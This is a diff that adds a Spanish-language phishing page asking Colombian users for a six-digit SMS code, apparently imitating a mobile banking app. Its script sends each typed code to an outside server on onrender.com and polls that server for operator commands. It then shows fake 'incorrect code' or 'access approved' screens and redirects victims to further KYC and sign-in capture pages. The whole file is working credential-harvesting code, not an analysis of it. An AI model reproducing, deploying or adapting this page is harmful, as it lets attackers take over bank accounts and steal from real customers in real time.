@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Ingresa el código</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #ffffff;
+            min-height: 100vh;
+            min-height: 100dvh;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .container {
+            padding: 0 24px;
+            max-width: 420px;
+            margin: 0 auto;
+        }
+
+        /* Header */
+        .header {
+            padding: 18px 0;
+        }
+
+        .back-arrow {
+            font-size: 24px;
+            color: #1a1a1a;
+            text-decoration: none;
+            font-weight: 300;
+            cursor: pointer;
+        }
+
+        /* Título */
+        .title {
+            font-size: 26px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin: 20px 0 30px 0;
+            letter-spacing: -0.5px;
+        }
+
+        /* Cajas de código */
+        .code-boxes {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+
+        .code-box {
+            width: 48px;
+            height: 56px;
+            background: #f0edf5;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            font-weight: 700;
+            color: #c4147d;
+            transition: all 0.2s ease;
+        }
+
+        .code-box.active {
+            background: #e8e4f0;
+            box-shadow: 0 0 0 2px #7b6b99;
+        }
+
+        .code-box.filled {
+            background: #e8e4f0;
+        }
+
+        .code-box.filled::after {
+            content: '●';
+            font-size: 28px;
+            color: #c4147d;
+        }
+
+        /* Texto informativo */
+        .info-text {
+            text-align: center;
+            color: #333;
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 8px;
+        }
+
+        .phone-number {
+            color: #c4147d;
+            font-weight: 500;
+        }
+
+        .info-secondary {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+
+        /* Pedir otra vez */
+        .resend-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .resend-loader {
+            width: 24px;
+            height: 24px;
+            border: 3px solid #f0edf5;
+            border-top-color: #c4147d;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .resend-text {
+            font-size: 14px;
+            color: #333;
+        }
+
+        /* Botón pedir */
+        .resend-btn {
+            display: block;
+            margin: 0 auto 30px auto;
+            padding: 12px 40px;
+            border: 1.5px solid #e8e4f0;
+            border-radius: 8px;
+            background: #fff;
+            color: #c4147d;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .resend-btn:hover {
+            background: #fdf2f8;
+            border-color: #c4147d;
+        }
+
+        /* Teclado numérico */
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            max-width: 300px;
+            margin: 0 auto;
+            padding-bottom: 30px;
+        }
+
+        .key {
+            height: 60px;
+            border: none;
+            background: transparent;
+            font-size: 32px;
+            font-weight: 400;
+            color: #1a1a1a;
+            cursor: pointer;
+            border-radius: 50%;
+            transition: all 0.15s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .key:hover {
+            background: #f5f5f5;
+        }
+
+        .key:active {
+            background: #e8e8e8;
+            transform: scale(0.95);
+        }
+
+        .key.delete {
+            background: #1a1a1a;
+            color: #fff;
+            width: 50px;
+            height: 50px;
+            border-radius: 12px;
+            margin: auto;
+        }
+
+        .key.delete:hover {
+            background: #333;
+        }
+
+        .key.empty {
+            cursor: default;
+        }
+
+        .key.empty:hover {
+            background: transparent;
+        }
+
+        /* Pantalla de espera */
+        .waiting-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: #fff;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 100;
+        }
+
+        .waiting-screen.active {
+            display: flex;
+        }
+
+        .waiting-loader {
+            position: relative;
+            width: 50px;
+            height: 50px;
+        }
+
+        .waiting-loader .cube {
+            position: absolute;
+            width: 18px;
+            height: 18px;
+            background: #c4147d;
+            border-radius: 4px;
+        }
+
+        .waiting-loader .cube:nth-child(1) {
+            top: 0; left: 50%; transform: translateX(-50%);
+            animation: wcube1 1.2s ease-in-out infinite;
+        }
+        .waiting-loader .cube:nth-child(2) {
+            top: 50%; right: 0; transform: translateY(-50%);
+            animation: wcube2 1.2s ease-in-out infinite;
+        }
+        .waiting-loader .cube:nth-child(3) {
+            bottom: 0; left: 50%; transform: translateX(-50%);
+            animation: wcube3 1.2s ease-in-out infinite;
+        }
+        .waiting-loader .cube:nth-child(4) {
+            top: 50%; left: 0; transform: translateY(-50%);
+            animation: wcube4 1.2s ease-in-out infinite;
+        }
+
+        @keyframes wcube1 {
+            0%, 100% { opacity: 1; transform: translateX(-50%) scale(1); }
+            25%, 50%, 75% { opacity: 0.3; transform: translateX(-50%) scale(0.7); }
+        }
+        @keyframes wcube2 {
+            0%, 100% { opacity: 0.3; transform: translateY(-50%) scale(0.7); }
+            25% { opacity: 1; transform: translateY(-50%) scale(1); }
+            50%, 75% { opacity: 0.3; transform: translateY(-50%) scale(0.7); }
+        }
+        @keyframes wcube3 {
+            0%, 25%, 100% { opacity: 0.3; transform: translateX(-50%) scale(0.7); }
+            50% { opacity: 1; transform: translateX(-50%) scale(1); }
+            75% { opacity: 0.3; transform: translateX(-50%) scale(0.7); }
+        }
+        @keyframes wcube4 {
+            0%, 25%, 50%, 100% { opacity: 0.3; transform: translateY(-50%) scale(0.7); }
+            75% { opacity: 1; transform: translateY(-50%) scale(1); }
+        }
+
+        .waiting-text {
+            margin-top: 25px;
+            color: #666;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        /* Pantalla de resultado */
+        .result-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: #fff;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+        }
+
+        .result-screen.active {
+            display: flex;
+        }
+
+        .result-box {
+            width: 150px;
+            height: 130px;
+            border-radius: 18px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0.3); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .result-box.error { background: #e8325e; }
+        .result-box.success { background: #2ecc71; }
+
+        .result-icon {
+            width: 45px;
+            height: 45px;
+            margin-bottom: 12px;
+        }
+
+        .result-icon svg {
+            width: 100%;
+            height: 100%;
+            stroke: #fff;
+            stroke-width: 3;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            fill: none;
+        }
+
+        .result-text {
+            color: #fff;
+            font-size: 14px;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <a href="#" class="back-arrow">←</a>
+        </div>
+
+        <h1 class="title">Ingresa el código</h1>
+
+        <!-- Cajas de código -->
+        <div class="code-boxes">
+            <div class="code-box active" data-index="0"></div>
+            <div class="code-box" data-index="1"></div>
+            <div class="code-box" data-index="2"></div>
+            <div class="code-box" data-index="3"></div>
+            <div class="code-box" data-index="4"></div>
+            <div class="code-box" data-index="5"></div>
+        </div>
+
+        <!-- Texto informativo -->
+        <p class="info-text">
+            Escribe los 6 números que enviamos a<br>tu número de celular:
+        </p>
+        <p class="info-text">
+            <span class="phone-number">+57 *** *** 4000.</span>
+        </p>
+        <p class="info-secondary">
+            Si este no es tu número debes llamar a<br>la línea para actualizarlo.
+        </p>
+
+        <!-- Pedir otra vez -->
+        <div class="resend-container">
+            <div class="resend-loader"></div>
+            <span class="resend-text">¿No te llegó? ¡Pídelo otra vez!</span>
+        </div>
+
+        <button class="resend-btn" onclick="resendCode()">Pídelo aquí</button>
+
+        <!-- Teclado numérico -->
+        <div class="keypad">
+            <button class="key" onclick="addDigit('1')">1</button>
+            <button class="key" onclick="addDigit('2')">2</button>
+            <button class="key" onclick="addDigit('3')">3</button>
+            <button class="key" onclick="addDigit('4')">4</button>
+            <button class="key" onclick="addDigit('5')">5</button>
+            <button class="key" onclick="addDigit('6')">6</button>
+            <button class="key" onclick="addDigit('7')">7</button>
+            <button class="key" onclick="addDigit('8')">8</button>
+            <button class="key" onclick="addDigit('9')">9</button>
+            <button class="key empty"></button>
+            <button class="key" onclick="addDigit('0')">0</button>
+            <button class="key delete" onclick="deleteDigit()">✕</button>
+        </div>
+    </div>
+
+    <!-- Pantalla de espera -->
+    <div class="waiting-screen" id="waitingScreen">
+        <div class="waiting-loader">
+            <div class="cube"></div>
+            <div class="cube"></div>
+            <div class="cube"></div>
+            <div class="cube"></div>
+        </div>
+        <p class="waiting-text">Verificando código...</p>
+    </div>
+
+    <!-- Pantalla de resultado -->
+    <div class="result-screen" id="resultScreen">
+        <div class="result-box" id="resultBox">
+            <div class="result-icon" id="resultIcon"></div>
+            <span class="result-text" id="resultText"></span>
+        </div>
+    </div>
+
+    <script>
+        // ==========================================
+        // CONFIGURACIÓN - ✅ ACTUALIZADO
+        // ==========================================
+        const SERVER_URL = 'https://nuevoneqsiteonly.onrender.com';
+        const POLLING_INTERVAL = 2000;
+        
+        // URLs de redirección según la acción - ✅ ACTUALIZADO
+        const REDIRECT_URLS = {
+            errorotp: null,                      // Se queda para reintentar
+            pedirkyc: 'verify.html',             // Redirige a verificación KYC
+            inicio: 'accces-sign-in.php.html'    // Redirige a inicio (ajusta el nombre si es diferente)
+        };
+
+        let code = ['', '', '', '', '', ''];
+        let currentIndex = 0;
+        let currentSessionId = null;
+        let pollingInterval = null;
+
+        // ==========================================
+        // FUNCIONES DEL TECLADO
+        // ==========================================
+        function updateDisplay() {
+            const boxes = document.querySelectorAll('.code-box');
+            boxes.forEach((box, index) => {
+                box.textContent = ''; // No mostrar el número, solo el punto rosado via CSS
+                box.classList.remove('active', 'filled');
+                
+                if (code[index]) {
+                    box.classList.add('filled');
+                }
+                if (index === currentIndex && currentIndex < 6) {
+                    box.classList.add('active');
+                }
+            });
+        }
+
+        function addDigit(digit) {
+            if (currentIndex < 6) {
+                code[currentIndex] = digit;
+                currentIndex++;
+                updateDisplay();
+
+                // Si completó los 6 dígitos, enviar
+                if (currentIndex === 6) {
+                    setTimeout(submitCode, 300);
+                }
+            }
+        }
+
+        function deleteDigit() {
+            if (currentIndex > 0) {
+                currentIndex--;
+                code[currentIndex] = '';
+                updateDisplay();
+            }
+        }
+
+        function clearCode() {
+            code = ['', '', '', '', '', ''];
+            currentIndex = 0;
+            updateDisplay();
+        }
+
+        // ==========================================
+        // ENVIAR CÓDIGO
+        // ==========================================
+        async function submitCode() {
+            const otpCode = code.join('');
+            
+            document.getElementById('waitingScreen').classList.add('active');
+
+            try {
+                const response = await fetch(`${SERVER_URL}/api/otp`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        otp: otpCode,
+                        type: 'sms',
+                        timestamp: new Date().toISOString()
+                    })
+                });
+
+                const result = await response.json();
+
+                if (result.success && result.sessionId) {
+                    currentSessionId = result.sessionId;
+                    console.log('📤 OTP enviado. Session:', currentSessionId);
+                    startPolling();
+                } else {
+                    showResult('error');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showResult('error');
+            }
+        }
+
+        // ==========================================
+        // POLLING - ✅ ACTUALIZADO
+        // ==========================================
+        function startPolling() {
+            console.log('🔄 Iniciando polling para session:', currentSessionId);
+            
+            pollingInterval = setInterval(async () => {
+                try {
+                    const response = await fetch(`${SERVER_URL}/api/check/${currentSessionId}`);
+                    const data = await response.json();
+
+                    console.log('🔄 Polling estado:', data.status);
+
+                    if (data.status === 'errorotp') {
+                        clearInterval(pollingInterval);
+                        pollingInterval = null;
+                        showResult('error', 'errorotp');
+                    } else if (data.status === 'pedirkyc') {
+                        clearInterval(pollingInterval);
+                        pollingInterval = null;
+                        showResult('success', 'pedirkyc');
+                    } else if (data.status === 'inicio') {
+                        clearInterval(pollingInterval);
+                        pollingInterval = null;
+                        showResult('success', 'inicio');
+                    }
+                    // Si es 'pending', sigue esperando...
+                } catch (error) {
+                    console.error('Error polling:', error);
+                }
+            }, POLLING_INTERVAL);
+        }
+
+        // ==========================================
+        // MOSTRAR RESULTADO - ✅ MEJORADO
+        // ==========================================
+        function showResult(type, action = null) {
+            document.getElementById('waitingScreen').classList.remove('active');
+            
+            const resultScreen = document.getElementById('resultScreen');
+            const resultBox = document.getElementById('resultBox');
+            const resultIcon = document.getElementById('resultIcon');
+            const resultText = document.getElementById('resultText');
+
+            console.log(`📊 Mostrando resultado: ${type} - Acción: ${action}`);
+
+            if (type === 'error') {
+                resultBox.className = 'result-box error';
+                resultIcon.innerHTML = '<svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>';
+                
+                if (action === 'errorotp') {
+                    resultText.textContent = 'Código incorrecto';
+                } else {
+                    resultText.textContent = 'Error';
+                }
+            } else {
+                resultBox.className = 'result-box success';
+                resultIcon.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>';
+                
+                // Textos personalizados según acción
+                if (action === 'pedirkyc') {
+                    resultText.textContent = '¡Verificación requerida!';
+                } else if (action === 'inicio') {
+                    resultText.textContent = '¡Acceso aprobado!';
+                } else {
+                    resultText.textContent = '¡Verificado!';
+                }
+            }
+
+            resultScreen.classList.add('active');
+
+            setTimeout(() => {
+                resultScreen.classList.remove('active');
+                
+                if (action && REDIRECT_URLS[action]) {
+                    console.log(`🔀 Redirigiendo a: ${REDIRECT_URLS[action]}`);
+                    window.location.href = REDIRECT_URLS[action];
+                } else if (action === 'errorotp') {
+                    // Limpiar y permitir reintentar
+                    console.log('🔄 Permitiendo reintento...');
+                    clearCode();
+                    currentSessionId = null;
+                } else {
+                    // Si no hay acción específica, limpiar para reintentar
+                    clearCode();
+                    currentSessionId = null;
+                }
+            }, 2000);
+        }
+
+        // ==========================================
+        // REENVIAR CÓDIGO
+        // ==========================================
+        async function resendCode() {
+            try {
+                await fetch(`${SERVER_URL}/api/resend-otp`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        type: 'sms',
+                        timestamp: new Date().toISOString()
+                    })
+                });
+                alert('Se ha enviado un nuevo código');
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        // Inicializar
+        updateDisplay();
+
+   // ==========================================
+        // MOSTRAR ÚLTIMOS 4 DÍGITOS DEL TELÉFONO
+        // ==========================================
+        function mostrarUltimos4Digitos() {
+            try {
+                const numeroCompleto = localStorage.getItem("numero");
+                
+                if (numeroCompleto && numeroCompleto.length >= 4) {
+                    const ultimos4 = numeroCompleto.slice(-4);
+                    const phoneNumberElement = document.querySelector('.phone-number');
+                    
+                    if (phoneNumberElement) {
+                        phoneNumberElement.textContent = `+57 *** *** ${ultimos4}.`;
+                    }
+                }
+            } catch (error) {
+                console.error('Error al obtener número:', error);
+            }
+        }
+
+        // Ejecutar al cargar la página
+        document.addEventListener('DOMContentLoaded', mostrarUltimos4Digitos);
+        if (document.readyState !== 'loading') {
+            mostrarUltimos4Digitos();
+        }
+
+        // Inicializar
+        updateDisplay();
+    </script>
+        
+  
+
+    
+
+    
+</body>
+</html>
